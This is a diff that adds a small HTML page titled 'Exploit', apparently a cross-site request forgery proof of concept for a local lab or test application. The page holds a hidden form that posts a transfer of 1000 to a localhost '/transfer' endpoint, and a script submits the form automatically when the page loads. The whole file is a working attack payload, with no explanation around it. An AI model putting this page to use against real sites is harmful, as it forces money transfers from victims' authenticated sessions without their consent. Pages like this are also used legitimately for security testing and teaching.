@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Exploit</title>
+</head>
+<body>
+    <form id="csrfForm" action="http://localhost:8080/transfer" method="POST">
+        <input type="hidden" name="amount" value="1000">
+    </form>
+    
+    <script>
+        // Ensures the form exists in the DOM before attempting to submit
+        window.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('csrfForm').submit();
+        });
+    </script>
+</body>
+</html>
+
